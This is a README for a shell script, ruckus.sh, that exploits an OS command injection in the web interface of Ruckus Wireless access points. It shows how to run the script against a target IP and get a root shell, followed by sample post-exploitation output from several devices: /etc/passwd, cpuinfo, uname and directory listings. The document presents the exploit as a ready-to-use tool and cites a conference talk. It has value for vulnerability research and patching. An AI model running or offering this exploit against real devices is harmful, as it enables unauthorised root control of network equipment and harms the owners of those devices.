Owning Ruckus Wireless Access Points  
=====

+ Easy explotation of an OS command ijection found out in the web interface. This basic script lets you to exploit it 
in a handy and faster way. 

References
----

* Conference : "Routers: El eslabón más débil".

Usage ruckus.sh
----

	$ ./ruckus.sh 
	Usage: ./ruckus.sh [TARGET]
	eg   : ./ruckus.sh 180.68.21.57



	$ ./ruckus.sh 1.2.3.4
	[+] Connecting to 1.2.3.4 and getting cookie...
	[+] Command injection on 1.2.3.4
	[+] Popping a shell...
	# cat /proc/cpuinfo
	system type		: Atheros AR5315
	processor		: 0
	cpu model		: MIPS 4KEc V6.4
	BogoMIPS		: 183.50
	wait instruction	: yes
	microsecond timers	: yes
	tlb_entries		: 16
	extra interrupt vector	: yes
	hardware watchpoint	: no
	ASEs implemented	:
	VCED exceptions		: not available
	VCEI exceptions		: not available


	# uname -a
	Linux RuckusAP 2.6.15 #1 Fri Oct 17 13:37:49 PDT 2008 mips unknown

	# cat /etc/passwd
	root:x:0:0:root:/:/bin/ash
	rkscli:x:0:0:root:/:/usr/bin/-rkscli
	bin:x:1:1:bin:/bin:/bin/sh
	daemon:x:2:2:daemon:/usr/sbin:/bin/sh
	adm:x:3:4:adm:/adm:/bin/sh
	lp:x:4:7:lp:/var/spool/lpd:/bin/sh
	sync:x:5:0:sync:/bin:/bin/sync
	shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
	halt:x:7:0:halt:/sbin:/sbin/halt
	uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
	operator:x:11:0:Operator:/var:/bin/sh
	nobody:x:65534:65534:nobody:/home:/bin/sh

	# ls -la /
	lrwxrwxrwx    1 root     root           23 Oct 17  2008 .ssh -> /writable/data/dropbear
	drwxr-xr-x    1 root     root          285 Oct 17  2008 bin
	drwxr-xr-x    1 root     root            0 Oct 17  2008 boot
	drwxr-xr-x    1 root     root           70 Oct 17  2008 defaults
	drwxr-xr-x    1 root     root          568 Oct 17  2008 dev
	drwxr-xr-x    1 root     root          390 Oct 17  2008 etc
	lrwxrwxrwx    1 root     root            9 Oct 17  2008 fl -> /writable
	drwxr-xr-x    1 root     root            0 Nov 22  1999 home
	drwxr-xr-x    1 root     root          475 Oct 17  2008 lib
	lrwxrwxrwx    1 root     root           11 Oct 17  2008 linuxrc -> bin/busybox
	drwxr-xr-x    1 root     root            0 Jan 21  1998 mnt
	drwxr-xr-x    1 root     root            0 Nov 22  1999 opt
	dr-xr-xr-x   49 root     root            0 Jan  1  2000 proc
	drwxr-xr-x    1 root     root            0 Nov 22  1999 root
	drwxr-xr-x    1 root     root          240 Oct 17  2008 sbin
	drwxrwxrwt    7 root     root          640 Jan 21 20:48 tmp
	drwxr-xr-x    1 root     root           41 Oct 17  2008 usr
	drwxr-xr-x    1 root     root           52 Oct 17  2008 var
	drwxr-xr-x    1 root     root          256 Oct 17  2008 web
	drwxr-xr-x    7 root     root            0 Jan  1  1970 writable








	# cat /proc/cpuinfo
	system type		: Atheros AR7242
	processor		: 0
	cpu model		: MIPS 24Kc V7.4
	BogoMIPS		: 265.21
	wait instruction	: yes
	microsecond timers	: yes
	tlb_entries		: 16
	extra interrupt vector	: yes
	hardware watchpoint	: yes, count: 4, address/irw mask: [0x0000, 0x0ff8, 0x00d8, 0x0970]
	ASEs implemented	: mips16
	shadow register sets	: 1
	core			: 0
	VCED exceptions		: not available
	VCEI exceptions		: not available

	# uname -a
	Linux RuckusAP 2.6.32.24 #1 Wed Mar 6 19:26:07 PST 2013 mips GNU/Linux






	# cat /proc/cpuinfo
	system type	    	: Atheros AR5315
	processor	     	: 0
	cpu model	    	: MIPS 4KEc V6.4
	BogoMIPS		    : 183.50
	wait instruction	: yes
	microsecond timers	: yes
	tlb_entries		    : 16
	extra interrupt vector	: yes
	hardware watchpoint	: no
	ASEs implemented	:
	VCED exceptions		: not available
	VCEI exceptions		: not available

	# uname -a
	Linux RuckusAP 2.6.15 #1 Fri Oct 23 14:26:09 PDT 2009 mips unknown






	# uname -a
	Linux RuckusAP 2.6.32.24 #1 Thu Aug 22 09:17:11 PDT 2013 ppc GNU/Linux

	# cat /proc/cpuinfo
	processor	: 0
	cpu	    	: e500v2
	clock		: 666.666660MHz
	revision	: 5.1 (pvr 8021 2051)
	bogomips	: 83.33
	timebase	: 41666666
	platform	: P1024 RDB
	model		: fsl,P1024
	Memory		: 128 MB
